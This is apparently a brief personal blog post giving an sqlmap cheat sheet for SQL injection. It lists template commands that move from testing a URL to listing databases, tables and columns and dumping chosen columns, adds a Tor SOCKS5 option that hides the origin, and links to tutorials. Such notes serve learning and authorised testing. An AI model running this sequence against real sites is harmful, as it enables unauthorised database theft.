Title: [Hack] sqlmap cheat sheet
Date: 2014-12-01 05:04
Author: m157q
Category: Hack
Tags: SQLinjection, sqlmap
Slug: hack-sqlmap-cheat-sheet

<!--more-->  
  
# Usage  
  
+ `$ sqlmap -u ${url}`  
  
+ `$ sqlmap -u ${url} --dbs`  
  
+ `$ sqlmap -u ${url} -D ${database} --tables`  
  
+ `$ sqlmap -u ${url} -D ${database} -T ${table} --columns`  
  
+ `$ sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump`  
  
# Options  
  
+ `--tor --tor-type=SOCKS5  
  
# References  
  
+ [sqlmap注入常见用法一条龙](http://www.nigesb.com/sqlmap-common-usage-and-examples.html)  
+ [sqlmap - Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
+ [An Old man lab0ratory: Sqlmap tutorial - you are just unavoidable](http://oldmanlab.blogspot.tw/2012/03/sqlmap-tutorial-you-are-just.html)  